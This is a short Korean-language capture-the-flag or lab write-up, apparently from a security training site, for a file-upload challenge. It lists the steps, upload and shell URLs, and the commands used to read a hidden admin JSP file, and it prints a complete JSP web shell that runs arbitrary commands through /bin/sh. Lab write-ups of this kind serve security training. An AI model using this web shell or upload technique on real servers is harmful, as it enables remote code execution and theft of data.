================================
파일 업로드 5번
================================

1. 공격 과정
  1-1) files[] 파라미터를 이용하여 JSP 웹셸 업로드
  1-2) 업로드 응답에서 저장 파일명과 경로 확인
  1-3) 업로드된 JSP 파일에 접근하여 코드 실행 확인
  1-4) cmd=ls 명령으로 원격 명령 실행 성공
  1-5) ls ./webapps 명령으로 admin_site 디렉터리 확인
  1-6) ls -al ./webapps/admin_site 명령으로 admin_super.jsp 발견
  1-7) cat ./webapps/admin_site/admin_super.jsp 명령으로 소스코드를 읽어 정답 획득

2. 공격 URL 및 파라미터
  2-1) 파일 업로드 URL
    https://lab.eqst.co.kr:8442/common23/file/uploadFile.json

    Parameter
    files[] = test.jsp
    uploadPath = qna/20261015

  2-2) 웹셸 실행 URL
    https://lab.eqst.co.kr:8440/data/files/qna/20261015/ab194857-c171-47f6-8484-5ebaa18bcd2f.jsp

    Parameter
    cmd = ls
    cmd = ls ./webapps
    cmd = ls -al ./webapps/admin_site
    cmd = cat ./webapps/admin_site/admin_super.jsp

  2-3) 정답 획득 위치
    /usr/local/tomcat/webapps/admin_site/admin_super.jsp

3. 사용한 악성코드
    <%@ page import="java.io.*" %>
    <%
    String c = request.getParameter("cmd");
    if (c != null) {
        Process p = Runtime.getRuntime().exec(
            new String[]{"/bin/sh", "-c", c}
        );
        BufferedReader r = new BufferedReader(
            new InputStreamReader(p.getInputStream())
        );
        String s;
        while ((s = r.readLine()) != null)
            out.println(s);
    }
    %>
